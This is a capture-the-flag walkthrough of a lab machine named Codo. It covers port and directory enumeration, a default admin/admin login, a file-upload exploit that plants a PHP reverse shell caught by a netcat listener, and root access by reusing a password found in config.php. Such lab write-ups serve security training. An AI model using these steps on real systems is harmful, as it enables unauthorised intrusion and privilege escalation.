##### Tags: `webenum`  `passwd-reuse`  `searchsploit`  `phpreverseshell`

# 🐧Codo🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.139.23
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 20:42 AEDT
Nmap scan report for 192.168.139.23
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
find a web page in port 80  
use gobuster and found /admin login page
```
$ gobuster dir -u http://192.168.139.23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.139.23
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 316] [--> http://192.168.139.23/admin/]
/sites                (Status: 301) [Size: 316] [--> http://192.168.139.23/sites/]
/cache                (Status: 301) [Size: 316] [--> http://192.168.139.23/cache/]
/sys                  (Status: 301) [Size: 314] [--> http://192.168.139.23/sys/]
```
use default admin admin successfully logged in  
the webpage is running Codo V.5.1.105  
searchsploit found this version is vulnerable to change logo  
https://www.exploit-db.com/exploits/50978  

we can upload a reverseshell and get the shell back  
From the exploit script it says the upload location is /sites/default/assets/img/attachments/  
after we upload the reverseshell in logo then visit to execute
```
http://192.168.139.23/sites/default/assets/img/attachments/php-reverse-shell.php
```
and we got the shell back
```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.139.23] 55894
Linux codo 5.4.0-150-generic #167-Ubuntu SMP Mon May 15 17:35:05 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
#id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation
we upload linpeas and check the output and found the passwd is exposed 
```
╔══════════╣ Searching passwords in config PHP files
/var/www/html/sites/default/config.php:  'password' => 'FatPanda123',
```
try the password on root and it success
```
www-data@codo:/$ su root
Password: FatPanda123

root@codo:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
